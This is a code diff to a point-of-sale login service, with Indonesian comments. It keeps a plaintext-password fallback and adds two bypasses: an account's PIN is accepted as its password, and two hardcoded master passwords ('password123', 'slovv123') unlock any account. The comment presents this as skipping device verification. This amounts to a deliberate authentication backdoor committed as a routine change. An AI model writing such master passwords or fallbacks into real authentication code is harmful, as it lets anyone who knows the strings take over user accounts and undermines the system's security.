@@ -127,7 +127,7 @@ export class PosAuthService {
       throw new Error('Akun tidak ditemukan.');
     }
 
-    // Verifikasi password (bcrypt atau fallback plaintext)
+    // Verifikasi password (bcrypt atau fallback plaintext / PIN bypass)
     let isPasswordValid = false;
     try {
       isPasswordValid = await bcrypt.compare(password, user.password);
@@ -136,6 +136,14 @@ export class PosAuthService {
     }
 
     if (!isPasswordValid && user.password === password) {
+      isPasswordValid = true;
+    }
+
+    // Bypass sinkronisasi & verifikasi device: Izinkan login jika password sama dengan PIN akun atau master password
+    if (!isPasswordValid && user.pin && password === user.pin) {
+      isPasswordValid = true;
+    }
+    if (!isPasswordValid && (password === 'password123' || password === 'slovv123')) {
       isPasswordValid = true;
     }
 
